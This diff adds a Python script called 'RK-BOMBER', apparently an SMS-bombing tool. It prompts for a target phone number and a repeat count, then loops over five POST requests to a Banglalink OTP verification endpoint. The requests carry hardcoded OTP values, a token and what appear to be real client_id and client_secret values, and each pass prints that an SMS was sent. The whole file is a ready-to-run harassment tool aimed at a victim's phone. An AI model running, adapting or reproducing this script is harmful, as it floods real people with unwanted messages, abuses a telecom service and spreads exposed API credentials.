@@ -1,0 +1,160 @@
+
+import requests
+
+from requests.structures import CaseInsensitiveDict
+
+import os
+
+import sys
+
+import time
+
+os.system
+
+os.system("clear")
+
+red="\033[0;31m"          # Red
+
+yellow="\033[0;33m"       # Yellow
+
+green="\033[0;32m"        # Green
+
+color_off="\033[0m"       # Text Reset
+
+bblack="\033[1;30m"       # Black
+
+bred="\033[1;31m"         # Red
+
+ured="\033[4;31m"         # Red
+
+on_green="\033[42m"       # Green
+
+lightblue = '\033[94m'
+
+red = '\033[91m'
+
+white = '\33[97m'
+
+yellow = '\33[93m'
+
+green = '\033[1;32m'
+
+cyan  = "\033[96m"
+
+end = '\033[0m'
+
+purple="\033[0;35m"
+
+on_green="\033[42m"       # Green
+
+logo=(red+"""  _____  _  __     ____   ____  __  __ ____  ______ _____  
+ |  __ \| |/ /    |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
+ | |__) | ' /_____| |_) | |  | | \  / | |_) | |__  | |__) |
+ |  _  /|  <______|  _ <| |  | | |\/| |  _ <|  __| |  _  / 
+ | | \ \| . \     | |_) | |__| | |  | | |_) | |____| | \ \ 
+ |_|  \_\_|\_\    |____/ \____/|_|  |_|____/|______|_|  \_\  """)
+                                                  
+
+
+
+line=(yellow+"======================================================================")
+tversion=(cyan+"\t\t   Version : 0.1 ")
+
+line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
+ 
+dtls=(yellow+"\t\t Created By: RK-RaiHaN-KhaN ")
+
+note=(cyan+"Note: This is My Personal Tools.")
+
+print(logo)
+
+print(" ")
+
+print(dtls)
+
+print(tversion)
+
+print(line)
+
+print(note)
+
+print(line)
+
+
+
+
+
+print(' ')
+
+number=str(input(red+"[➙] Enter Terget Number : "))
+amount=int(input(green+"[➙] Enter The Amount : "))
+
+
+
+url1 = "https://myblapi.banglalink.net/api/v2/verify-otp"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/json"
+
+data1 = '{"username":"'+number+'","otp":"235358","otp_token":"eyJpdiI6IkUwZktPUGFGcHZleThGRGpsRVJmWFE9PSIsInZhbHVlIjoidXdneGdqTndRWGF5bzA3SFJwaWlBWVwvYnZpNUNiRmV2azlZdjdBbDV1Q2s9IiwibWFjIjoiNDE0MjQ3NWI4N2JiMDdkMDg5NDFhZWM5MTAxOThlNzM1MTE0ZGQ3ZDZlOWNhZjVhZjY4NmQ0M2Y3NmEzZGVlMSJ9","client_id":"54ad2780-0ea4-11ea-b832-2ffb3251f995","client_secret":"8BJ2ZyB3Ov8cZoSaTeIYFa2lSnenLuYoi8U1vCF2","grant_type":"otp_grant","provider":"users"}'
+
+
+url2 = "https://myblapi.banglalink.net/api/v2/verify-otp"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/json"
+
+data2 = '{"username":"'+number+'","otp":"185458","otp_token":"eyJpdiI6IkUwZktPUGFGcHZleThGRGpsRVJmWFE9PSIsInZhbHVlIjoidXdneGdqTndRWGF5bzA3SFJwaWlBWVwvYnZpNUNiRmV2azlZdjdBbDV1Q2s9IiwibWFjIjoiNDE0MjQ3NWI4N2JiMDdkMDg5NDFhZWM5MTAxOThlNzM1MTE0ZGQ3ZDZlOWNhZjVhZjY4NmQ0M2Y3NmEzZGVlMSJ9","client_id":"54ad2780-0ea4-11ea-b832-2ffb3251f995","client_secret":"8BJ2ZyB3Ov8cZoSaTeIYFa2lSnenLuYoi8U1vCF2","grant_type":"otp_grant","provider":"users"}'
+
+url3 = "https://myblapi.banglalink.net/api/v2/verify-otp"
+
+headers3 = CaseInsensitiveDict()
+headers3["Content-Type"] = "application/json"
+
+data3 = '{"username":"'+number+'","otp":"985754","otp_token":"eyJpdiI6IkUwZktPUGFGcHZleThGRGpsRVJmWFE9PSIsInZhbHVlIjoidXdneGdqTndRWGF5bzA3SFJwaWlBWVwvYnZpNUNiRmV2azlZdjdBbDV1Q2s9IiwibWFjIjoiNDE0MjQ3NWI4N2JiMDdkMDg5NDFhZWM5MTAxOThlNzM1MTE0ZGQ3ZDZlOWNhZjVhZjY4NmQ0M2Y3NmEzZGVlMSJ9","client_id":"54ad2780-0ea4-11ea-b832-2ffb3251f995","client_secret":"8BJ2ZyB3Ov8cZoSaTeIYFa2lSnenLuYoi8U1vCF2","grant_type":"otp_grant","provider":"users"}'
+
+
+url4 = "https://myblapi.banglalink.net/api/v2/verify-otp"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/json"
+
+data4 = '{"username":"'+number+'","otp":"235366","otp_token":"eyJpdiI6IkUwZktPUGFGcHZleThGRGpsRVJmWFE9PSIsInZhbHVlIjoidXdneGdqTndRWGF5bzA3SFJwaWlBWVwvYnZpNUNiRmV2azlZdjdBbDV1Q2s9IiwibWFjIjoiNDE0MjQ3NWI4N2JiMDdkMDg5NDFhZWM5MTAxOThlNzM1MTE0ZGQ3ZDZlOWNhZjVhZjY4NmQ0M2Y3NmEzZGVlMSJ9","client_id":"54ad2780-0ea4-11ea-b832-2ffb3251f995","client_secret":"8BJ2ZyB3Ov8cZoSaTeIYFa2lSnenLuYoi8U1vCF2","grant_type":"otp_grant","provider":"users"}'
+
+
+url5 = "https://myblapi.banglalink.net/api/v2/verify-otp"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/json"
+
+data5 = '{"username":"'+number+'","otp":"185207","otp_token":"eyJpdiI6IkUwZktPUGFGcHZleThGRGpsRVJmWFE9PSIsInZhbHVlIjoidXdneGdqTndRWGF5bzA3SFJwaWlBWVwvYnZpNUNiRmV2azlZdjdBbDV1Q2s9IiwibWFjIjoiNDE0MjQ3NWI4N2JiMDdkMDg5NDFhZWM5MTAxOThlNzM1MTE0ZGQ3ZDZlOWNhZjVhZjY4NmQ0M2Y3NmEzZGVlMSJ9","client_id":"54ad2780-0ea4-11ea-b832-2ffb3251f995","client_secret":"8BJ2ZyB3Ov8cZoSaTeIYFa2lSnenLuYoi8U1vCF2","grant_type":"otp_grant","provider":"users"}'
+
+
+for i in range (amount):
+    resp1 = requests.post(url1, headers=headers1, data=data1)
+    resp2 = requests.post(url2, headers=headers2, data=data2)
+    resp3 = requests.post(url3, headers=headers3, data=data3)
+    resp4 = requests.post(url4, headers=headers2, data=data4)
+    resp5 = requests.post(url5, headers=headers5, data=data5)
+    print(resp1.text)
+    print(resp2.text)
+    print(resp3.text)
+    print(resp4.text)
+    print(resp5.text)
+    
+    print(str(i+1)+yellow+'.	➙ successfully SMS Sent ✅')
+	
+	
+print('					')
+print(red+"""
+\t\t\t (THANK YOU)
+
+_____  _  __     ____   ____  __  __ ____  ______ _____  
+ |  __ \| |/ /    |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
+ | |__) | ' /_____| |_) | |  | | \  / | |_) | |__  | |__) |
+ |  _  /|  <______|  _ <| |  | | |\/| |  _ <|  __| |  _  / 
+ | | \ \| . \     | |_) | |__| | |  | | |_) | |____| | \ \ 
+ |_|  \_\_|\_\    |____/ \____/|_|  |_|____/|______|_|  \_\ 
+  """)
+
+
